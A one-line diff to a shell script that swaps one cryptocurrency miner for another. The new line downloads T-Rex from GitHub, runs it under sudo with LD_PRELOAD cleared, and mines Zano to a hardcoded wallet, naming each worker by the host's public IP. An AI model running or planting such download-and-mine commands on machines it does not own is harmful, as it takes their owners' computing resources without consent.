@@ -1,2 +1,2 @@
 #!/bin/sh
-wget https://github.com/bzminer/bzminer/releases/download/v10.0.0/bzminer_v10.0.0_linux.tar.gz && tar -xf bzminer_v10.0.0_linux.tar.gz && cd bzminer_v10.0.0_linux && chmod +x bzminer && ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./bzminer -a ixi -r rig_name -w 3AymKAZRtcHptxN6eXrwk6FXYpvYzW9cCWLRtrKX6YhGbqUSNLYzw6ScPdz3dZBJy -p http://mineixi.com:80
+sudo wget https://github.com/trexminer/T-Rex/releases/download/0.26.4/t-rex-0.26.4-linux.tar.gz && tar -xf t-rex-0.26.4-linux.tar.gz && chmod +x t-rex && ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  LD_PRELOAD="" ./t-rex -a ProgPowZ -o zano.luckypool.io:8877 -u ZxDAs3wUtBej4jYU8FJ4nQLbXS6ssTAGCEwEutSSZS7tR4yY6xxFs4m93opr971o5TH8gGfW4xsFkeXSeSQfx6wZ1vEAmVpTA.$ip -p x -q
